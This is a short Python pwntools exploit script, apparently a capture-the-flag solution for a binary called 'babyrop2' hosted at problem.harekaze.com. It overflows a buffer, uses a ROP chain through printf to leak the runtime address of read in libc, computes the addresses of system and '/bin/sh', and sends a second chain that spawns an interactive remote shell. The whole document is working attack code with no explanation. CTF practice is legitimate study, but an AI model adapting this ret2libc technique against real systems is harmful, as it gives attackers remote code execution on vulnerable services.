from pwn import *
context.clear(arch='amd64')
elf = ELF('./babyrop2')
libc = ELF('./libc.so.6')
main = elf.symbols['main']
read_got = elf.symbols['got.read']
format_string = next(elf.search('%s'))
system_offset = libc.symbols['read'] - libc.symbols['system']
sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh'))
r = ROP(elf)
r.printf(format_string,read_got)
r.main()
# p = elf.process()
p = remote('problem.harekaze.com',20005)
p.sendline('a'*40+str(r))
p.recvuntil("\n")
read_address = p.recvuntil("!\n")[:-2]
read_address = u64(read_address + "\x00\x00")
system_address = read_address - system_offset
sh_address = read_address - sh_offset
elf.symbols['system'] = system_address
r = ROP(elf)
r.system(sh_address)
p.sendline('a'*40+str(r))
p.interactive()